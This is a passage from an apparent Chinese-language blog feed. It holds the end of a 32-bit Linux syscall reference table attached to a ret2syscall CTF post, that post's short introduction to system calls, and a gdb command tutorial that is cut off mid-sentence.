*setting</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>262</td><td>timer_getoverrun</td><td>0x106</td><td>timer_t timer_id</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>263</td><td>timer_delete</td><td>0x107</td><td>timer_t timer_id</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>264</td><td>clock_settime</td><td>0x108</td><td>clockid_t which_clock</td><td>const struct __kernel_timespec *tp</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>265</td><td>clock_gettime</td><td>0x109</td><td>clockid_t which_clock</td><td>struct __kernel_timespec *tp</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>266</td><td>clock_getres</td><td>0x10a</td><td>clockid_t which_clock</td><td>struct __kernel_timespec *tp</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>267</td><td>clock_nanosleep</td><td>0x10b</td><td>clockid_t which_clock</td><td>int flags</td><td>const struct __kernel_timespec *rqtp</td><td>struct __kernel_timespec *rmtp</td><td>-</td><td>-</td></tr><tr><td>268</td><td>statfs64</td><td>0x10c</td><td>const char *path</td><td>size_t sz</td><td>struct statfs64 *buf</td><td>-</td><td>-</td><td>-</td></tr><tr><td>269</td><td>fstatfs64</td><td>0x10d</td><td>unsigned int fd</td><td>size_t sz</td><td>struct statfs64 *buf</td><td>-</td><td>-</td><td>-</td></tr><tr><td>270</td><td>tgkill</td><td>0x10e</td><td>pid_t tgid</td><td>pid_t pid</td><td>int sig</td><td>-</td><td>-</td><td>-</td></tr><tr><td>271</td><td>utimes</td><td>0x10f</td><td>char *filename</td><td>struct timeval *utimes</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>272</td><td>fadvise64_64</td><td>0x110</td><td>int fd</td><td>loff_t offset</td><td>loff_t len</td><td>int advice</td><td>-</td><td>-</td></tr><tr><td>273</td><td>vserver</td><td>0x111</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>274</td><td>mbind</td><td>0x112</td><td>unsigned long start</td><td>unsigned long len</td><td>unsigned long mode</td><td>const unsigned long *nmask</td><td>unsigned long maxnode</td><td>unsigned flags</td></tr><tr><td>275</td><td>get_mempolicy</td><td>0x113</td><td>int *policy</td><td>unsigned long *nmask</td><td>unsigned long maxnode</td><td>unsigned long addr</td><td>unsigned long flags</td><td>-</td></tr><tr><td>276</td><td>set_mempolicy</td><td>0x114</td><td>int mode</td><td>const unsigned long *nmask</td><td>unsigned long maxnode</td><td>-</td><td>-</td><td>-</td></tr><tr><td>277</td><td>mq_open</td><td>0x115</td><td>const char *name</td><td>int oflag</td><td>umode_t mode</td><td>struct mq_attr *attr</td><td>-</td><td>-</td></tr><tr><td>278</td><td>mq_unlink</td><td>0x116</td><td>const char *name</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>279</td><td>mq_timedsend</td><td>0x117</td><td>mqd_t mqdes</td><td>const char *msg_ptr</td><td>size_t msg_len</td><td>unsigned int msg_prio</td><td>const struct __kernel_timespec *abs_timeout</td><td>-</td></tr><tr><td>280</td><td>mq_timedreceive</td><td>0x118</td><td>mqd_t mqdes</td><td>char *msg_ptr</td><td>size_t msg_len</td><td>unsigned int *msg_prio</td><td>const struct __kernel_timespec *abs_timeout</td><td>-</td></tr><tr><td>281</td><td>mq_notify</td><td>0x119</td><td>mqd_t mqdes</td><td>const struct sigevent *notification</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>282</td><td>mq_getsetattr</td><td>0x11a</td><td>mqd_t mqdes</td><td>const struct mq_attr *mqstat</td><td>struct mq_attr *omqstat</td><td>-</td><td>-</td><td>-</td></tr><tr><td>283</td><td>kexec_load</td><td>0x11b</td><td>unsigned long entry</td><td>unsigned long nr_segments</td><td>struct kexec_segment *segments</td><td>unsigned long flags</td><td>-</td><td>-</td></tr><tr><td>284</td><td>waitid</td><td>0x11c</td><td>int which</td><td>pid_t pid</td><td>struct siginfo *infop</td><td>int options</td><td>struct rusage *ru</td><td>-</td></tr><tr><td>285</td><td>not implemented</td><td>0x11d</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>286</td><td>add_key</td><td>0x11e</td><td>const char *_type</td><td>const char *_description</td><td>const void *_payload</td><td>size_t plen</td><td>key_serial_t destringid</td><td>-</td></tr><tr><td>287</td><td>request_key</td><td>0x11f</td><td>const char *_type</td><td>const char *_description</td><td>const char *_callout_info</td><td>key_serial_t destringid</td><td>-</td><td>-</td></tr><tr><td>288</td><td>keyctl</td><td>0x120</td><td>int cmd</td><td>unsigned long arg2</td><td>unsigned long arg3</td><td>unsigned long arg4</td><td>unsigned long arg5</td><td>-</td></tr><tr><td>289</td><td>ioprio_set</td><td>0x121</td><td>int which</td><td>int who</td><td>int ioprio</td><td>-</td><td>-</td><td>-</td></tr><tr><td>290</td><td>ioprio_get</td><td>0x122</td><td>int which</td><td>int who</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>291</td><td>inotify_init</td><td>0x123</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>292</td><td>inotify_add_watch</td><td>0x124</td><td>int fd</td><td>const char *path</td><td>u32 mask</td><td>-</td><td>-</td><td>-</td></tr><tr><td>293</td><td>inotify_rm_watch</td><td>0x125</td><td>int fd</td><td>__s32 wd</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>294</td><td>migrate_pages</td><td>0x126</td><td>pid_t pid</td><td>unsigned long maxnode</td><td>const unsigned long *from</td><td>const unsigned long *to</td><td>-</td><td>-</td></tr><tr><td>295</td><td>openat</td><td>0x127</td><td>int dfd</td><td>const char *filename</td><td>int flags</td><td>umode_t mode</td><td>-</td><td>-</td></tr><tr><td>296</td><td>mkdirat</td><td>0x128</td><td>int dfd</td><td>const char * pathname</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td></tr><tr><td>297</td><td>mknodat</td><td>0x129</td><td>int dfd</td><td>const char * filename</td><td>umode_t mode</td><td>unsigned dev</td><td>-</td><td>-</td></tr><tr><td>298</td><td>fchownat</td><td>0x12a</td><td>int dfd</td><td>const char *filename</td><td>uid_t user</td><td>gid_t group</td><td>int flag</td><td>-</td></tr><tr><td>299</td><td>futimesat</td><td>0x12b</td><td>int dfd</td><td>const char *filename</td><td>struct timeval *utimes</td><td>-</td><td>-</td><td>-</td></tr><tr><td>300</td><td>fstatat64</td><td>0x12c</td><td>int dfd</td><td>const char *filename</td><td>struct stat64 *statbuf</td><td>int flag</td><td>-</td><td>-</td></tr><tr><td>301</td><td>unlinkat</td><td>0x12d</td><td>int dfd</td><td>const char * pathname</td><td>int flag</td><td>-</td><td>-</td><td>-</td></tr><tr><td>302</td><td>renameat</td><td>0x12e</td><td>int olddfd</td><td>const char * oldname</td><td>int newdfd</td><td>const char * newname</td><td>-</td><td>-</td></tr><tr><td>303</td><td>linkat</td><td>0x12f</td><td>int olddfd</td><td>const char *oldname</td><td>int newdfd</td><td>const char *newname</td><td>int flags</td><td>-</td></tr><tr><td>304</td><td>symlinkat</td><td>0x130</td><td>const char * oldname</td><td>int newdfd</td><td>const char * newname</td><td>-</td><td>-</td><td>-</td></tr><tr><td>305</td><td>readlinkat</td><td>0x131</td><td>int dfd</td><td>const char *path</td><td>char *buf</td><td>int bufsiz</td><td>-</td><td>-</td></tr><tr><td>306</td><td>fchmodat</td><td>0x132</td><td>int dfd</td><td>const char * filename</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td></tr><tr><td>307</td><td>faccessat</td><td>0x133</td><td>int dfd</td><td>const char *filename</td><td>int mode</td><td>-</td><td>-</td><td>-</td></tr><tr><td>308</td><td>pselect6</td><td>0x134</td><td>int</td><td>fd_set *</td><td>fd_set *</td><td>fd_set *</td><td>struct timespec *</td><td>void *</td></tr><tr><td>309</td><td>ppoll</td><td>0x135</td><td>struct pollfd *</td><td>unsigned int</td><td>struct timespec *</td><td>const sigset_t *</td><td>size_t</td><td>-</td></tr><tr><td>310</td><td>unshare</td><td>0x136</td><td>unsigned long unshare_flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>311</td><td>set_robust_list</td><td>0x137</td><td>struct robust_list_head *head</td><td>size_t len</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>312</td><td>get_robust_list</td><td>0x138</td><td>int pid</td><td>struct robust_list_head * *head_ptr</td><td>size_t *len_ptr</td><td>-</td><td>-</td><td>-</td></tr><tr><td>313</td><td>splice</td><td>0x139</td><td>int fd_in</td><td>loff_t *off_in</td><td>int fd_out</td><td>loff_t *off_out</td><td>size_t len</td><td>unsigned int flags</td></tr><tr><td>314</td><td>sync_file_range</td><td>0x13a</td><td>int fd</td><td>loff_t offset</td><td>loff_t nbytes</td><td>unsigned int flags</td><td>-</td><td>-</td></tr><tr><td>315</td><td>tee</td><td>0x13b</td><td>int fdin</td><td>int fdout</td><td>size_t len</td><td>unsigned int flags</td><td>-</td><td>-</td></tr><tr><td>316</td><td>vmsplice</td><td>0x13c</td><td>int fd</td><td>const struct iovec *iov</td><td>unsigned long nr_segs</td><td>unsigned int flags</td><td>-</td><td>-</td></tr><tr><td>317</td><td>move_pages</td><td>0x13d</td><td>pid_t pid</td><td>unsigned long nr_pages</td><td>const void * *pages</td><td>const int *nodes</td><td>int *status</td><td>int flags</td></tr><tr><td>318</td><td>getcpu</td><td>0x13e</td><td>unsigned *cpu</td><td>unsigned *node</td><td>struct getcpu_cache *cache</td><td>-</td><td>-</td><td>-</td></tr><tr><td>319</td><td>epoll_pwait</td><td>0x13f</td><td>int epfd</td><td>struct epoll_event *events</td><td>int maxevents</td><td>int timeout</td><td>const sigset_t *sigmask</td><td>size_t sigsetsize</td></tr><tr><td>320</td><td>utimensat</td><td>0x140</td><td>int dfd</td><td>const char *filename</td><td>struct timespec *utimes</td><td>int flags</td><td>-</td><td>-</td></tr><tr><td>321</td><td>signalfd</td><td>0x141</td><td>int ufd</td><td>sigset_t *user_mask</td><td>size_t sizemask</td><td>-</td><td>-</td><td>-</td></tr><tr><td>322</td><td>timerfd_create</td><td>0x142</td><td>int clockid</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>323</td><td>eventfd</td><td>0x143</td><td>unsigned int count</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>324</td><td>fallocate</td><td>0x144</td><td>int fd</td><td>int mode</td><td>loff_t offset</td><td>loff_t len</td><td>-</td><td>-</td></tr><tr><td>325</td><td>timerfd_settime</td><td>0x145</td><td>int ufd</td><td>int flags</td><td>const struct __kernel_itimerspec *utmr</td><td>struct __kernel_itimerspec *otmr</td><td>-</td><td>-</td></tr><tr><td>326</td><td>timerfd_gettime</td><td>0x146</td><td>int ufd</td><td>struct __kernel_itimerspec *otmr</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>327</td><td>signalfd4</td><td>0x147</td><td>int ufd</td><td>sigset_t *user_mask</td><td>size_t sizemask</td><td>int flags</td><td>-</td><td>-</td></tr><tr><td>328</td><td>eventfd2</td><td>0x148</td><td>unsigned int count</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>329</td><td>epoll_create1</td><td>0x149</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>330</td><td>dup3</td><td>0x14a</td><td>unsigned int oldfd</td><td>unsigned int newfd</td><td>int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td>331</td><td>pipe2</td><td>0x14b</td><td>int *fildes</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>332</td><td>inotify_init1</td><td>0x14c</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>333</td><td>preadv</td><td>0x14d</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td>-</td></tr><tr><td>334</td><td>pwritev</td><td>0x14e</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td>-</td></tr><tr><td>335</td><td>rt_tgsigqueueinfo</td><td>0x14f</td><td>pid_t tgid</td><td>pid_t pid</td><td>int sig</td><td>siginfo_t *uinfo</td><td>-</td><td>-</td></tr><tr><td>336</td><td>perf_event_open</td><td>0x150</td><td>struct perf_event_attr *attr_uptr</td><td>pid_t pid</td><td>int cpu</td><td>int group_fd</td><td>unsigned long flags</td><td>-</td></tr><tr><td>337</td><td>recvmmsg</td><td>0x151</td><td>int fd</td><td>struct mmsghdr *msg</td><td>unsigned int vlen</td><td>unsigned flags</td><td>struct timespec *timeout</td><td>-</td></tr><tr><td>338</td><td>fanotify_init</td><td>0x152</td><td>unsigned int flags</td><td>unsigned int event_f_flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>339</td><td>fanotify_mark</td><td>0x153</td><td>int fanotify_fd</td><td>unsigned int flags</td><td>u64 mask</td><td>int fd</td><td>const char *pathname</td><td>-</td></tr><tr><td>340</td><td>prlimit64</td><td>0x154</td><td>pid_t pid</td><td>unsigned int resource</td><td>const struct rlimit64 *new_rlim</td><td>struct rlimit64 *old_rlim</td><td>-</td><td>-</td></tr><tr><td>341</td><td>name_to_handle_at</td><td>0x155</td><td>int dfd</td><td>const char *name</td><td>struct file_handle *handle</td><td>int *mnt_id</td><td>int flag</td><td>-</td></tr><tr><td>342</td><td>open_by_handle_at</td><td>0x156</td><td>int mountdirfd</td><td>struct file_handle *handle</td><td>int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td>343</td><td>clock_adjtime</td><td>0x157</td><td>clockid_t which_clock</td><td>struct timex *tx</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>344</td><td>syncfs</td><td>0x158</td><td>int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>345</td><td>sendmmsg</td><td>0x159</td><td>int fd</td><td>struct mmsghdr *msg</td><td>unsigned int vlen</td><td>unsigned flags</td><td>-</td><td>-</td></tr><tr><td>346</td><td>setns</td><td>0x15a</td><td>int fd</td><td>int nstype</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>347</td><td>process_vm_readv</td><td>0x15b</td><td>pid_t pid</td><td>const struct iovec *lvec</td><td>unsigned long liovcnt</td><td>const struct iovec *rvec</td><td>unsigned long riovcnt</td><td>unsigned long flags</td></tr><tr><td>348</td><td>process_vm_writev</td><td>0x15c</td><td>pid_t pid</td><td>const struct iovec *lvec</td><td>unsigned long liovcnt</td><td>const struct iovec *rvec</td><td>unsigned long riovcnt</td><td>unsigned long flags</td></tr><tr><td>349</td><td>kcmp</td><td>0x15d</td><td>pid_t pid1</td><td>pid_t pid2</td><td>int type</td><td>unsigned long idx1</td><td>unsigned long idx2</td><td>-</td></tr><tr><td>350</td><td>finit_module</td><td>0x15e</td><td>int fd</td><td>const char *uargs</td><td>int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td>351</td><td>sched_setattr</td><td>0x15f</td><td>pid_t pid</td><td>struct sched_attr *attr</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td>352</td><td>sched_getattr</td><td>0x160</td><td>pid_t pid</td><td>struct sched_attr *attr</td><td>unsigned int size</td><td>unsigned int flags</td><td>-</td><td>-</td></tr><tr><td>353</td><td>renameat2</td><td>0x161</td><td>int olddfd</td><td>const char *oldname</td><td>int newdfd</td><td>const char *newname</td><td>unsigned int flags</td><td>-</td></tr><tr><td>354</td><td>seccomp</td><td>0x162</td><td>unsigned int op</td><td>unsigned int flags</td><td>const char *uargs</td><td>-</td><td>-</td><td>-</td></tr><tr><td>355</td><td>getrandom</td><td>0x163</td><td>char *buf</td><td>size_t count</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td>356</td><td>memfd_create</td><td>0x164</td><td>const char *uname_ptr</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>357</td><td>bpf</td><td>0x165</td><td>int cmd</td><td>union bpf_attr *attr</td><td>unsigned int size</td><td>-</td><td>-</td><td>-</td></tr><tr><td>358</td><td>execveat</td><td>0x166</td><td>int dfd</td><td>const char *filename</td><td>const char *const *argv</td><td>const char *const *envp</td><td>int flags</td><td>-</td></tr><tr><td>359</td><td>socket</td><td>0x167</td><td>int</td><td>int</td><td>int</td><td>-</td><td>-</td><td>-</td></tr><tr><td>360</td><td>socketpair</td><td>0x168</td><td>int</td><td>int</td><td>int</td><td>int *</td><td>-</td><td>-</td></tr><tr><td>361</td><td>bind</td><td>0x169</td><td>int</td><td>struct sockaddr *</td><td>int</td><td>-</td><td>-</td><td>-</td></tr><tr><td>362</td><td>connect</td><td>0x16a</td><td>int</td><td>struct sockaddr *</td><td>int</td><td>-</td><td>-</td><td>-</td></tr><tr><td>363</td><td>listen</td><td>0x16b</td><td>int</td><td>int</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>364</td><td>accept4</td><td>0x16c</td><td>int</td><td>struct sockaddr *</td><td>int *</td><td>int</td><td>-</td><td>-</td></tr><tr><td>365</td><td>getsockopt</td><td>0x16d</td><td>int fd</td><td>int level</td><td>int optname</td><td>char *optval</td><td>int *optlen</td><td>-</td></tr><tr><td>366</td><td>setsockopt</td><td>0x16e</td><td>int fd</td><td>int level</td><td>int optname</td><td>char *optval</td><td>int optlen</td><td>-</td></tr><tr><td>367</td><td>getsockname</td><td>0x16f</td><td>int</td><td>struct sockaddr *</td><td>int *</td><td>-</td><td>-</td><td>-</td></tr><tr><td>368</td><td>getpeername</td><td>0x170</td><td>int</td><td>struct sockaddr *</td><td>int *</td><td>-</td><td>-</td><td>-</td></tr><tr><td>369</td><td>sendto</td><td>0x171</td><td>int</td><td>void *</td><td>size_t</td><td>unsigned</td><td>struct sockaddr *</td><td>int</td></tr><tr><td>370</td><td>sendmsg</td><td>0x172</td><td>int fd</td><td>struct user_msghdr *msg</td><td>unsigned flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td>371</td><td>recvfrom</td><td>0x173</td><td>int</td><td>void *</td><td>size_t</td><td>unsigned</td><td>struct sockaddr *</td><td>int *</td></tr><tr><td>372</td><td>recvmsg</td><td>0x174</td><td>int fd</td><td>struct user_msghdr *msg</td><td>unsigned flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td>373</td><td>shutdown</td><td>0x175</td><td>int</td><td>int</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>374</td><td>userfaultfd</td><td>0x176</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>375</td><td>membarrier</td><td>0x177</td><td>int cmd</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>376</td><td>mlock2</td><td>0x178</td><td>unsigned long start</td><td>size_t len</td><td>int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td>377</td><td>copy_file_range</td><td>0x179</td><td>int fd_in</td><td>loff_t *off_in</td><td>int fd_out</td><td>loff_t *off_out</td><td>size_t len</td><td>unsigned int flags</td></tr><tr><td>378</td><td>preadv2</td><td>0x17a</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td>rwf_t flags</td></tr><tr><td>379</td><td>pwritev2</td><td>0x17b</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td>rwf_t flags</td></tr><tr><td>380</td><td>pkey_mprotect</td><td>0x17c</td><td>unsigned long start</td><td>size_t len</td><td>unsigned long prot</td><td>int pkey</td><td>-</td><td>-</td></tr><tr><td>381</td><td>pkey_alloc</td><td>0x17d</td><td>unsigned long flags</td><td>unsigned long init_val</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>382</td><td>pkey_free</td><td>0x17e</td><td>int pkey</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>383</td><td>statx</td><td>0x17f</td><td>int dfd</td><td>const char *path</td><td>unsigned flags</td><td>unsigned mask</td><td>struct statx *buffer</td><td>-</td></tr><tr><td>384</td><td>arch_prctl</td><td>0x180</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr></tbody></table><h3 id="x86-64-Syscall-table"><a href="#x86-64-Syscall-table" class="headerlink" title="x86_64 Syscall table"></a>x86_64 Syscall table</h3><p><img src="/2025/06/06/pwn-ret2syscall/QQ%E6%88%AA%E5%9B%BE20250606153717.png" alt="QQ截图20250606153717"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;pwn-ret2syscall&quot;&gt;&lt;a href=&quot;#pwn-ret2syscall&quot; class=&quot;headerlink&quot; title=&quot;pwn-ret2syscall&quot;&gt;&lt;/a&gt;pwn-ret2syscall&lt;/h1&gt;&lt;h2 id=&quot;syscall简介&quot;&gt;&lt;a href=&quot;#syscall简介&quot; class=&quot;headerlink&quot; title=&quot;syscall简介&quot;&gt;&lt;/a&gt;syscall简介&lt;/h2&gt;&lt;p&gt;&lt;code&gt;syscall&lt;/code&gt; 就是连接用户态和内核态的桥梁 Linux系统中 &lt;code&gt;用户空间通过向内核空间发出syscall 产生软中断从而让程序陷入内核态 执行相应的操作&lt;/code&gt; 而对于每个系统调用都会有一个对应的系统调用号 系统调用提供用户程序与操作系统间的接口 部分库函数(scanf、puts)等IO相关的函数实际上是对系统调用的封装(read和write)&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/usr/include/x86_64-linux-gnu/asm/unistd_64.h&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/usr/include/x86_64-linux-gnu/asm/unistd_32.h&lt;/code&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>gdb命令使用</title>
    <link href="http://example.com/2025/06/05/gdb%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8/"/>
    <id>http://example.com/2025/06/05/gdb%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8/</id>
    <published>2025-06-05T12:10:46.000Z</published>
    <updated>2025-06-09T10:09:06.014Z</updated>
    
    <content type="html"><![CDATA[<p><strong>在程序编译时增加-g选项以支持gdb调试</strong></p><p>如：</p><p>$ gcc -g example.c -o example.x</p><p>通过上述命令对example.c编译之后，使用下列命令进入到gdb调试：</p><p>$ gdb example.x</p><p>在gdb调试中，常用的命令有以下几个：</p><p>$ list 缩略为 l</p><p>列出程序源码，每次列出10行，按回车重复运行上一命令；</p><p>$ run 缩略为 r</p><p>程序开始运行，在r后可以加入程序启动参数，程序运行到断点处暂停；</p><p>$ continue 缩略为 c</p><span id="more"></span><p>程序继续运行，到下一断点处暂停；</p><p>单步调试</p><p>$ step 缩略为s</p><p>$ next 缩略为 n</p><p>程序继续运行到下一断点；</p><p>$ break 缩略为 b</p><p>在程序某一位置设置断点；</p><p>$ info break 缩略为 i b</p><p>查看断点信息；</p><p>设置&#x2F;查看运行参数</p><p>$ set args —&#x2F;show args</p><p>加载运行中的进程进行调试(Attach to the running process to be debugged.)：</p><p>$ gdb attatch pid</p><p>Specifying source directories</p><p>$ dir dirname …</p><p>以十六进制输出内存块数据</p><p>$ x&#x2F;28hx —</p><p>段错误调试，core文件样例</p><p>通过ulimit命令查看一下系统是否配置支持了dump core的功能。通过ulimit -c或ulimit -a，可以查看core file大小的配置情况，如果为0，则表示系统关闭了dump core；可以通过ulimit -c unlimited来打开。若发生了段错误，但没有core dump，是由于系统禁止core文件的生成。</p><p><strong>$ gdb [exec file] [core file]</strong></p><p>查看堆栈信息：</p><p>$ bt</p><p>PS：对于python程序在linux下可以使用pdb做调试！</p><p>Published by Windows Livewriter.</p><p><strong>调试开始时，必须先载入要进行调试的程序，可以用以下两种方式：</strong></p><p>　* 在启动gdb后执行以下命令：</p><p>　　　file 可执行文件路径</p><p>　* 在gdb启动时就载入程序：</p><p>　　　gdb 可执行文件路径</p><p>载入程序后，接下来就是要进行断点的设置，要监视的变量的添加等工作，下面对在这个过程中常会用到的命令逐一进行介绍：</p><p>　* list ：显示程序中的代码，常用使用格式有：</p><p>　　　　list</p><p>　　　　　　输出从上次调用list命令开始往后的10行程序代码。</p><p>　　　　list -</p><p>　　　　　　输出从上次调用list命令开始往前的10行程序代码。</p><p>　　　　list n</p><p>　　　　　　输出第n行附近的10行程序代码。</p><p>　　　　list function</p><p>　　　　　　输出函数function前后的10行程序代码。</p><p>　* forward&#x2F;search ：从当前行向后查找匹配某个字符串的程序行。使用格式：</p><p>　　　　<strong>forward&#x2F;search 字符串</strong></p><p>　　查找到的行号将保存在$_变量中，可以用print $_命令来查看。</p><p>　* reverse-search ：和forward&#x2F;search相反，向前查找字符串。使用格式同上。</p><p>　* break ：在程序中设置断点，当程序运行到指定行上时，会暂停执行。使用格式：</p><p>　　　　break 要设置断点的行号</p><p>　* tbreak ：设置临时断点，在设置之后只起作用一次。使用格式：</p><p>　　　　tbreak 要设置临时断点的行号</p><p>　* clear ：和break相反，clear用于清除断点。使用格式：</p><p>　　　　clear 要清除的断点所在的行号</p><p>　* run ：启动程序，在run后面带上参数可以传递给正在调试的程序。</p><p>　* awatch ：用来增加一个观察点(add watch)，使用格式：</p><p>　　　　awatch 变量或表达式</p><p>　　当表达式的值发生改变或表达式的值被读取时，程序就会停止运行。</p><p>　* watch ：与awatch类似用来设置观察点，但程序只有当表达式的值发生改变时才会停止运行。使用格 式：</p><p>　　　　watch 变量或表达式</p><p>　　需要注意的是，awatch和watch都必须在程序运行的过程中设置观察点，即可运行run之后才能设置。</p><p>　*** commands ：设置在遇到断点后执行特定的指令。**使用格式有：</p><p>　　　　commands</p><p>　　　　　　设置遇到最后一个遇到的断点时要执行的命令</p><p>　　　　commands n</p><p>　　　　　　设置遇到断点号n时要执行的命令</p><p>　　注意，commands后面跟的是断点号，而不是断点所在的行号。</p><p>　　在输入命令后，就可以输入遇到断点后要执行的命令，每行一条命令，在输入最后一条命令后输入end就可以结束输入。</p><p>　* delete ：清除断点或自动显示的表达式。使用格式：</p><p>　　　　delete 断点号</p><p>　* disable ：让指定断点失效。使用格式：</p><p>　　　　disable 断点号列表</p><p>　　断点号之间用空格间隔开。</p><p>　* enable ：和disable相反，恢复失效的断点。使用格式：</p><p>　　　　enable 断点编号列表</p><p>　* ignore ：忽略断点。使用格式：</p><p>　　　　ignore 断点号 忽略次数</p><p>　* condition ：设置断点在一定条件下才能生效。使用格式：</p><p>　　　　condition 断点号 条件表达式</p><p>　* cont&#x2F;continue ：使程序在暂停在断点之后继续运行。使用格式：</p><p>　　　　cont</p><p>　　　　　　跳过当前断点继续运行。</p><p>　　　　cont n</p><p>　　　　　　跳过n次断点，继续运行。</p><p>　　当n为1时，cont 1即为cont。</p><p>　* jump ：让程序跳到指定行开始调试。使用格式：</p><p>　　　　jump 行号</p><p>　*** next ：继续执行语句，但是跳过子程序的调用**。使用格式：</p><p>　　　　next</p><p>　　　　　　执行一条语句</p><p>　　　　next n</p><p>　　　　　　执行n条语句</p><p>　* nexti ：单步执行语句，但和next不同的是，它会跟踪到子程序的内部，但不打印出子程序内部的语句。使用格式同上。</p><p>　* step ：与next类似，但是它会跟踪到子程序的内部，而且会显示子程序内部的执行情况。使用格式同上。</p><p>　* stepi ：与step类似，但是比step更详细，是nexti和step的结合。使用格式同上。</p><p>　* whatis ：显示某个变量或表达式的数据类型。使用格式：</p><p>　　　　whatis 变量或表达式</p><p>　* ptype ：和whatis类似，用于显示数据类型，但是它还可以显示typedef定义的类型等。使用格式：</p><p>　　　　ptype 变量或表达式</p><p>　* set ：设置程序中变量的值。使用格式：</p><p>　　　　set 变量&#x3D;表达式</p><p>　　　　set 变量:&#x3D;表达式</p><p>　* display ：增加要显示值的表达式。使用格式：</p><p>　　　　display 表达式</p><p>　* info display ：显示当前所有的要显示值的表达式。</p><p>　* delete display&#x2F;undisplay ：删除要显示值的表达式。使用格式：</p><p>　　　　delete display&#x2F;undisplay 表达式编号</p><p>　* disable display ：暂时不显示一个要表达式的值。使用格式：</p><p>　　　　disable display 表达式编号</p><p>　* enable display ：与disable display相反，使用表达式恢复显示。使用格式：</p><p>　　　　enable display 表达式编号</p><p>　*** print ：打印变量或表达式的值。**使用格式：</p><p>　　　　print 变量或表达式</p><p>　　表达式中有两个符号有特殊含义：$和$$。</p><p>　　$表示给定序号的前一个序号，$$表示给定序号的前两个序号。</p><p>　　如果$和$$后面不带数字，则给定序号为当前序号。</p><p>　* backtrace ：打印指定个数的栈帧(stack frame)。使用格式：</p><p>　　　　backtrace 栈帧个数</p><p>　* frame ：打印栈帧。使用格式：</p><p>　　　　frame 栈帧号</p><p>　* info frame ：显示当前栈帧的详细信息。</p><p>　* select-frame ：选择栈帧，选择后可以用info frame来显示栈帧信息。使用格式：</p><p>　　　　select-frame 栈帧号</p><ul><li>kill ：结束当前程序的调试。<br>　* quit ：退出gdb。</li></ul><h2 id="查看内存"><a href="#查看内存" class="headerlink" title="查看内存"></a>查看内存</h2><p>x&#x2F;&lt;n&#x2F;f&#x2F;u&gt; <addr></addr></p><p>n、f、u是可选的参数。</p><p>n 是一个正整数，表示显示内存的长度，也就是说从当前地址向后显示几个地址的内容。<br>f 表示显示的格式，参见上面。如果地址所指的是字符串，那么格式可以是s，如果地十是指令地址，那么格式可以是i。<br>u 